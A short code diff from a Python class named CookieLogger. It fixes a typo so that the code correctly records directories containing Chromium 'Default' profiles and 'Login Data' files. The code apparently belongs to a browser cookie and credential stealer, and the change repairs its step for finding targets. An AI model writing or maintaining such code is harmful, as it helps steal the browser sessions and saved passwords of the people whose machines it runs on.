@@ -65,7 +65,7 @@ class CookieLogger:
                                 if "Default" in os.listdir(_root):
                                     found.append([_root, True])
                                 elif "Login Data" in os.listdir(_root):
-                                    found.append([_loot, False])
+                                    found.append([_root, False])
                                 else:
                                     pass
                 except Exception:
